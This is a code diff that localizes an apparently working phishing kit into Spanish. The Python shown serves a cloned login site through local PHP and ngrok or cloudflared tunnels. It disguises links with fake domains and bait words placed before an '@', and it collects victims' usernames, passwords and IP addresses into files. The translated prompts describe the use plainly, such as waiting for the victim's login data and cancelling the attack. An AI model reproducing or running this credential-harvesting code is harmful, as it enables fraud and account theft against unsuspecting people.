@@ -320,7 +320,7 @@ def sudoinstaller(pm):
 
 # Ask to mask url
 def cuask(url):
-    cust= input("\n"+ask+bcyan+"Wanna try custom link?(y or press enter to skip) > ")
+    cust= input("\n"+ask+yellow+"¿Quiere probar el vínculo personalizado? (o presione Intro para omitir) > ")
     if not cust=="":
         masking(url)
     waiter()
@@ -809,19 +809,19 @@ def server():
     if termux:
         sprint("\n"+info+"If you haven't enabled hotspot, please enable it!")
         sleep(1)
-    sprint("\n"+info2+"Initializing PHP server at localhost:8080....")
+    sprint("\n"+info2+"Inicializando el servidor PHP en localhost:8080....")
     internet()
     system("cd $HOME/.site && php -S 127.0.0.1:8080 > /dev/null 2>&1 &")
     sleep(2)
     while True:
         if not system("curl --output /dev/null --silent --head --fail 127.0.0.1:8080"):
-            sprint("\n"+info+"PHP Server has started successfully!")
+            sprint("\n"+info+"¡El servidor PHP se ha iniciado con éxito!")
             break
         else:
             sprint(error+"PHP Error")
             killer()
             exit(1)
-    sprint("\n"+info2+"Initializing tunnelers at same address.....")
+    sprint("\n"+info2+"Inicializando túneles en la misma dirección.....")
     internet()
     system("rm -rf $HOME/.cffolder/log.txt")
     while True:
@@ -859,7 +859,7 @@ def server():
             cuask(ngroklink)
             break
         elif not (cfcheck and ngrokcheck):
-            sprint("\n"+error+"Tunneling failed! Use your own tunneling service on port 8080!"+nc)
+            sprint("\n"+error+"¡Tunelización fallida! Utilice su propio servicio de tunelización en el puerto 8080!"+nc)
             waiter()
             break
         else:
@@ -875,55 +875,55 @@ def masking(url):
     main1= os.popen("curl -s "+website)
     main2=main1.read()
     if not main2.find("gd")!=-1:
-        sprint(error+"Service not available")
+        sprint(error+"Servicio no disponible")
         waiter()
     main= main2.replace("https://", "")
-    domain= input("\n"+ask+"Enter custom domain(Example: google.com, yahoo.com > ")
+    domain= input("\n"+ask+"Ingrese un dominio personalizado (Ejemplo: google.com, discord.com etc > ")
     if domain=="":
-        sprint("\n"+error+"No domain!")
-        bait= input("\n"+ask+"Enter bait words without space and hyphen (Example: free-money, pubg-mod) > ")
+        sprint("\n"+error+"¡Sin dominio!")
+        bait= input("\n"+ask+"Ingrese palabras cebo sin espacio ni guión (Ejemplo: dinero-gratis, pubg-mod) > ")
         if (bait==""):
-            sprint("\n"+error+"No bait word!")
-            sprint("\n"+success+"Your url is > https://"+ main)
+            sprint("\n"+error+"¡Ninguna palabra de cebo!")
+            sprint("\n"+success+"Tu enlace es > https://"+ main)
             waiter()
         if bait.find(" ")!=-1:
-            sprint("\n"+error+"Space in bait word!")
+            sprint("\n"+error+"¡Espacio en la palabra cebo!")
             waiter()
         final= "https://"+bait+"@"+main
-        sprint("\n"+success+"Your url is > "+ final)
+        sprint("\n"+success+"Tu enlace es > "+ final)
         waiter()
     if (domain.find("http://")!=-1 or domain.find("https://")!=-1):
-        bait= input("\n"+ask+"Enter bait words without space and hyphen (Example: free-money, pubg-mod) > ")
+        bait= input("\n"+ask+"Ingrese palabras cebo sin espacio ni guión (Ejemplo: dinero-gratis, pubg-mod) > ")
         if (bait==""):
-            sprint("\n"+error+"No bait word!")
+            sprint("\n"+error+"¡Ninguna palabra de cebo!")
             final= domain+"@"+main
-            sprint("\n"+success+"Your url is > "+ final)
+            sprint("\n"+success+"Tu enlace es > "+ final)
             waiter()
         if bait.find(" ")!=-1:
-            sprint("\n"+error+"Space in bait word!")
+            sprint("\n"+error+"¡Espacio en la palabra cebo!")
             waiter()
         final= domain+"-"+bait+"@"+main
-        sprint("\n"+success+"Your url is > "+ final)
+        sprint("\n"+success+"Tu enlace es > "+ final)
         waiter()
     else:
         domain= "https://"+domain
-        bait= input("\n"+ask+"Enter bait words without space and hyphen(Example: free-money, pubg-mod) > ")
+        bait= input("\n"+ask+"Ingrese palabras cebo sin espacio ni guión (Ejemplo: dinero-gratis, pubg-mod) > ")
         if bait=="":
-            sprint("\n"+error+"No bait word!")
+            sprint("\n"+error+"¡Ninguna palabra de cebo!")
             final= domain+"@"+main
-            sprint("\n"+success+"Your url is > "+ final)
+            sprint("\n"+success+"Tu enlace es > "+ final)
             waiter()
         if bait.find(" ")!=-1:
-            sprint("\n"+error+"Space in bait word!")
+            sprint("\n"+error+"¡Espacio en la palabra cebo!")
             waiter()
         final= domain+"-"+bait+"@"+main
-        sprint("\n"+success+"Your url is > "+ final)
+        sprint("\n"+success+"Tu enlace es > "+ final)
         waiter()
 
 # Output urls
 def url_manager(url,num1,num2):
     internet()
-    sprint("\n"+success+"Your urls are given below: \n")
+    sprint("\n"+success+"Sus ENLACES se dan a continuación: \n")
     print(info2+"URL "+num1+" > "+yellow+url)
     if os.path.isfile(root+"/.site/.info.txt"):
         with open(root+"/.site/.info.txt", "r") as inform:
@@ -934,7 +934,7 @@ def url_manager(url,num1,num2):
 # Last function capturing credentials
 def waiter():
     system("rm -rf $HOME/.site/ip.txt")
-    sprint("\n"+info+blue+"Waiting for login info...."+cyan+"Press "+red+"Ctrl+C"+cyan+" to exit")
+    sprint("\n"+info+red+"Esperando Información de [inicio de sesión] de la victima...."+cyan+"Press "+red+"Ctrl+C"+cyan+" Para Cancelar el ataque")
     try:
         while True:
             if os.path.isfile(root+"/.site/usernames.txt"):
@@ -944,26 +944,26 @@ def waiter():
                     j=0
                     o=len(userdata)
                     while j<o:
-                        print(cyan+'['+green+'*'+cyan+'] '+yellow+userdata[j],end="")
+                        print(cyan+'['+red+'-->'+cyan+'] '+yellow+userdata[j],end="")
                         j+=1
-                print("\n"+info+"Saved in usernames.txt")
-                print("\n"+info+blue+"Waiting for next....."+cyan+"Press "+red+"Ctrl+C"+cyan+" to exit")
+                print("\n"+info+"Guardado con exito en usernames.txt")
+                print("\n"+info+red+"Esperando al siguiente....."+cyan+"Press "+red+"Ctrl+C"+cyan+" Para Cancelar el ataque")
                 system("cat $HOME/.site/usernames.txt >> usernames.txt")
                 os.remove(root+"/.site/usernames.txt")
             sleep(0.75)
             if os.path.isfile(root+"/.site/ip.txt"):
                 os.system("clear")
                 print(logo)
-                print("\n\n"+success+bgreen+"Victim IP found!\n\007")
+                print("\n\n"+success+bgreen+"¡la IP de la Víctima Online!\n\007")
                 with open(root+"/.site/ip.txt","r") as ipfile:
                     ipdata=ipfile.readlines()
                     h=0
                     p=len(ipdata)
                     while h<p:
-                        print(cyan+'['+green+'*'+cyan+'] '+yellow+ipdata[h], end="")
+                        print(cyan+'['+red+'-->'+cyan+'] '+yellow+ipdata[h], end="")
                         h+=1
-                print("\n"+info+"Saved in ip.txt")
-                print("\n"+info+blue+"Waiting for next...."+cyan+"Press "+red+"Ctrl+C"+cyan+" to exit")
+                print("\n"+info+"Guardado con exito en ip.txt")
+                print("\n"+info+red+"Esperando al siguiente...."+cyan+"Press "+red+"Ctrl+C"+cyan+" Para Cancelar el ataque")
                 system("cat $HOME/.site/ip.txt >> ip.txt")
                 os.system("rm -rf $HOME/.site/ip.txt")
             sleep(0.75)
